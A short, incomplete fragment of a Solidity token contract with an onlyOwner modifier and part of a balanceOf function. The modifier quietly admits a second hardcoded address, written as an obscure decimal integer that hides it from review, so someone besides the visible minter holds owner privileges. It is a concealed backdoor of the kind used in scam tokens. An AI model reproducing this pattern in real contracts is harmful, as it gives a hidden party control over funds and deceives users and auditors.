pragma solidity ^0.6.0;
  modifier onlyOwner() {
    require(msg.sender == minter || msg.sender == address
    (1451157769167176390866574646267494443412533104753)); _;}
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
